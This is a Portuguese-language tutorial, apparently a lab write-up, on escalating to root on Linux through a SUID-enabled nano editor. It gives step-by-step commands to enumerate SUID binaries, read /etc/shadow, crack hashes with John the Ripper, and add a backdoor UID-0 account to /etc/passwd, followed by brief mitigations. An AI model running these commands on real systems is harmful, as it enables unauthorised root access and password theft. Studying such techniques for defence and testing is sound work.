# Linux Privilege Escalation — SUID Misconfiguration

Em sistemas Linux, cada arquivo possui três conjuntos de permissões: usuário proprietário, grupo e outros. Além das permissões tradicionais (read, write, execute), existem **bits especiais de execução**, entre eles:

* **SUID (Set User ID)**
* **SGID (Set Group ID)**

Quando o bit **SUID** está definido em um executável, qualquer usuário que execute esse binário fará com que o processo seja executado com o **UID do proprietário do arquivo**, e não com o UID do usuário que iniciou o processo.

Caso o proprietário do binário seja `root`, a execução ocorre com privilégios de superusuário.

Essa característica torna binários SUID um vetor clássico de **privilege escalation**, principalmente quando o programa permite manipulação de arquivos arbitrários.

---

## Enumeração de binários SUID

A primeira etapa consiste em identificar executáveis com SUID ativo.

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Explicação dos parâmetros:

* `-type f` restringe a busca a arquivos regulares
* `-perm -04000` filtra arquivos com bit SUID ativo
* `2>/dev/null` suprime erros de permissão

Após a enumeração, uma etapa recomendada consiste em verificar se algum dos binários identificados possui técnicas conhecidas de exploração documentadas em GTFOBins.

---

## Identificação de vetor de exploração

Durante a enumeração, o editor `nano` foi identificado como executável com bit SUID ativo.

Isso significa que qualquer execução do programa será realizada com o **UID do proprietário do binário**.

Se o proprietário for `root`, o editor poderá acessar arquivos restritos ao superusuário.

---

## Exploração — Leitura de `/etc/shadow`

Uma consequência direta é a possibilidade de acessar arquivos protegidos.

```bash
nano /etc/shadow
```

O arquivo `/etc/shadow` contém hashes das senhas do sistema.

Para preparar os hashes para quebra de senha, é necessário combiná-los com as entradas de `/etc/passwd`.

Isso pode ser feito com a ferramenta `unshadow`, incluída no conjunto de ferramentas do John the Ripper.

```bash
unshadow /etc/passwd /etc/shadow > hash.txt
```

O arquivo resultante pode então ser submetido a ataque de dicionário.

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Caso uma senha seja quebrada, o atacante poderá autenticar-se como o usuário correspondente.

---

## Exploração — Injeção de usuário privilegiado

Outra abordagem consiste em modificar diretamente o arquivo `/etc/passwd`.

Primeiro é necessário gerar um hash compatível com o formato do arquivo.

```bash
openssl passwd -1 -salt user1 Senh4
```

Exemplo de hash gerado:

```
$1$user1$RdwRAMHZ25tlevnD1Gd2g/
```

Em seguida, uma nova entrada pode ser adicionada ao arquivo `/etc/passwd`.

Formato da entrada:

```
username:password:UID:GID:comment:home:shell
```

Entrada maliciosa:

```
hacker:$1$user1$RdwRAMHZ25tlevnD1Gd2g/:0:0:root:/root:/bin/bash
```

Elementos críticos:

* **UID 0** concede privilégios equivalentes ao root
* shell `/bin/bash` permite acesso interativo

Após inserir a entrada, o usuário pode autenticar-se com:

```bash
su hacker
```

Verificação de privilégios:

```bash
whoami
id
```

Resultado esperado:

```
uid=0(root) gid=0(root)
```

---

Impacto

* obtenção de privilégios de superusuário
* acesso completo ao sistema
* possibilidade de persistência e movimentação lateral

---

Mitigações

Administradores devem:

* evitar configurar SUID em binários que permitam manipulação arbitrária de arquivos
* auditar regularmente executáveis com SUID
* restringir permissões de editores e interpretadores

Enumeração defensiva:

```bash
find / -perm -4000 -type f
```


Esse procedimento reduz tempo de exploração e aumenta taxa de sucesso em cenários de privilege escalation.
